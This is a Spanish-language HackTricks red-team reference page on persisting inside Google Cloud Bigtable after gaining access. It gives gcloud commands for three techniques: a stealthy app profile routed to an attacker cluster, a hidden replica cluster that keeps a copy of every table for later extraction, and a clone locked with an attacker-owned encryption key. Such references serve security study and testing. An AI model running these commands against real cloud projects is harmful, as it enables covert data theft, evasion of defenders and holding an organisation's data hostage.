# GCP - Bigtable Persistencia

{{#include ../../../banners/hacktricks-training.md}}

## Bigtable

Para más información sobre Bigtable consulta:

{{#ref}}
../gcp-services/gcp-bigtable-enum.md
{{#endref}}

### App Profile dedicado para atacante

**Permissions:** `bigtable.appProfiles.create`, `bigtable.appProfiles.update`.

Crea un app profile que dirija el tráfico a tu replica cluster y habilita Data Boost para que no dependas de nodos provisionados que los defensores puedan detectar.

<details>

<summary>Crear app profile sigiloso</summary>
```bash
gcloud bigtable app-profiles create stealth-profile \
--instance=<instance-id> --route-any --restrict-to=<attacker-cluster> \
--row-affinity --description="internal batch"

gcloud bigtable app-profiles update stealth-profile \
--instance=<instance-id> --data-boost \
--data-boost-compute-billing-owner=HOST_PAYS
```
</details>

Mientras este perfil exista, puedes reconectarte usando credenciales nuevas que lo referencien.

### Mantén tu propio clúster réplica

**Permisos:** `bigtable.clusters.create`, `bigtable.instances.update`, `bigtable.clusters.list`.

Implementa un clúster con el número mínimo de nodos en una región tranquila. Incluso si tus identidades de cliente desaparecen, **el clúster conserva una copia completa de cada tabla** hasta que los defensores lo eliminen explícitamente.

<details>

<summary>Crear clúster réplica</summary>
```bash
gcloud bigtable clusters create dark-clone \
--instance=<instance-id> --zone=us-west4-b --num-nodes=1
```
</details>

Vigílalo mediante `gcloud bigtable clusters describe dark-clone --instance=<instance-id>` para que puedas escalarlo instantáneamente cuando necesites extraer datos.

### Asegura la replicación con tu propio CMEK

**Permisos:** `bigtable.clusters.create`, `cloudkms.cryptoKeyVersions.useToEncrypt` en la attacker-owned key.

Trae tu propia KMS key al crear un clon. Sin esa key, Google no puede re-crear ni hacer fail over del cluster, por lo que blue teams deben coordinarse contigo antes de tocarlo.

<details>

<summary>Crear clúster protegido con CMEK</summary>
```bash
gcloud bigtable clusters create cmek-clone \
--instance=<instance-id> --zone=us-east4-b --num-nodes=1 \
--kms-key=projects/<attacker-proj>/locations/<kms-location>/keyRings/<ring>/cryptoKeys/<key>
```
</details>

Rota o desactiva la clave en tu proyecto para inutilizar instantáneamente la réplica (aunque todavía te permita volver a activarla más tarde).

{{#include ../../../banners/hacktricks-training.md}}
